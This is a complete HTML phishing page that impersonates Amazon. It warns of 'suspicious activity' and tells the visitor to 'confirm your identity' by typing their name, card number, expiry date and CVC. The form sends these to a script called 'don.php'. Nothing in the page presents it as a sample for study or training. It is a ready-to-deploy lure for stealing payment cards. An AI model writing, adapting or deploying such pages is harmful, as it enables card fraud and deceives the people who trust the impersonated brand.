<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Confirm your identity</title>
  <link rel="stylesheet" href="./style.css">
</head>
<body>
<form class="checkout" action="don.php" method="post">
  <div class="paragraph">
  <p><center>We've detected some suspicious activity <br> on your amazon account <br> please verify your identity to <br>continue using amazon account.</center></p>
</div>
  <div class="checkout-header">
    <h1 class="checkout-title">
      Confirm your identity
    </h1>
  </div>
  <p>
    <input type="text" class="checkout-input checkout-name" placeholder="Your Name" name="Name" autofocus required maxlength="50">
    <input type="tel" class="checkout-input checkout-exp" placeholder="MM" name="Ex_M" required maxlength="2">
    <input type="tel" class="checkout-input checkout-exp" placeholder="YY" name="Ex_Y" required maxlength="2">
  </p>
  <p>
    <input type="tel" class="checkout-input checkout-card" placeholder="Card Number" name="C_Number" required maxlength="19">
    <input type="tel" class="checkout-input checkout-cvc" placeholder="CVC" name="cvv" required maxlength="4">
  </p>
  <p>
    <input type="submit" value="PROCEED" class="checkout-btn">
  </p>
</form>
</body>
</html>